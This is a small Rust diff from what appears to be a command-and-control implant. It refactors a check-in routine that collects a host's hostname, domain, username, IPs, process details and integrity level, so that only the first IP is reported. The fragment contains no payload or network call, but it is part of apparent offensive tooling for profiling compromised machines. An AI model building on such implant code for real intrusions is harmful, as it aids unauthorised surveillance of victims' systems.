@@ -82,13 +82,14 @@ pub fn init_checkin_data() {
         let process_handle = -1isize as _;
         let rid = get_process_integrity(process_handle);
 
+        let first_ip = ip_addresses.unwrap().get_mut(0).unwrap().1.clone();
         // Create a Checkin object with the gathered metadata
         let mut checkin = Box::new(Checkin::new(PartialCheckin {
             operative_system: operating_system,
             hostname: hostname,
             domain: get_user_domain(),
             username: get_username(),
-            ips: ip_addresses.unwrap(),
+            ip: first_ip,
             process_id: pid as i64,
             parent_process_id: ppid as i64,
             process_name: get_process_name(),
